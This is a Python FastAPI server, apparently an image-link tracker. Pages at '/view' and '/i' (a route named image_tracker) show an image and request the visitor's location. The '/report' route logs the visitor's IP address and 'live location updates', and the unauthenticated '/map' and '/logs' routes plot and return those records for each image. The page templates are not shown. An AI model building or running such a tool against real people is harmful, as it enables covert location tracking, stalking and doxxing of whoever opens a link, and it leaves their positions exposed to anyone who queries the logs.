from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import json
import time
from pathlib import Path

# Config
LOGFILE = "locations_log.jsonl"
IMAGE_FOLDER = Path("static/images")

app = FastAPI()

# Mount static folder for images/css/js
app.mount("/static", StaticFiles(directory="static"), name="static")

# Jinja2 template setup
templates = Jinja2Templates(directory="templates")

def log_record(record: dict):
    """Append location report to a JSONL log file"""
    with open(LOGFILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(record, ensure_ascii=False) + "\n")

@app.on_event("startup")
def startup_event():
    IMAGE_FOLDER.mkdir(parents=True, exist_ok=True)

@app.get("/view/{image_id}", response_class=HTMLResponse)
async def view_image(request: Request, image_id: str):
    """Serve the HTML page that requests user location and shows the image"""
    image_path = IMAGE_FOLDER / image_id
    if not image_path.is_file():
        raise HTTPException(status_code=404, detail="Image not found")
    return templates.TemplateResponse(
        "view.html",
        {"request": request, "img_url": f"/static/images/{image_id}", "image_id": image_id}
    )

@app.post("/report")
async def report_location(request: Request):
    """Receive live location updates from client"""
    try:
        payload = await request.json()
    except:
        payload = {}
    record = {
        "received_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "remote_addr": request.client.host if request.client else "unknown",
        "payload": payload
    }
    log_record(record)
    return JSONResponse(content={"ok": True})




from fastapi.responses import FileResponse

@app.get("/map/{image_id}", response_class=HTMLResponse)
async def show_map(request: Request, image_id: str):
    return templates.TemplateResponse(
        "map.html",
        {"request": request, "image_id": image_id}
    )

@app.get("/logs/{image_id}")
async def get_logs(image_id: str):
    """Return logs for a specific image_id as JSON list"""
    records = []
    if Path(LOGFILE).is_file():
        with open(LOGFILE, "r", encoding="utf-8") as f:
            for line in f:
                try:
                    record = json.loads(line)
                    if record.get("payload", {}).get("image") == image_id:
                        records.append(record)
                except:
                    continue
    return JSONResponse(content=records)



@app.get("/i/{image_id}", response_class=HTMLResponse)
async def image_tracker(request: Request, image_id: str):
    image_path = IMAGE_FOLDER / image_id
    if not image_path.is_file():
        raise HTTPException(status_code=404, detail="Image not found")
    return templates.TemplateResponse(
        "view.html",
        {"request": request, "img_url": f"/static/images/{image_id}", "image_id": image_id}
    )
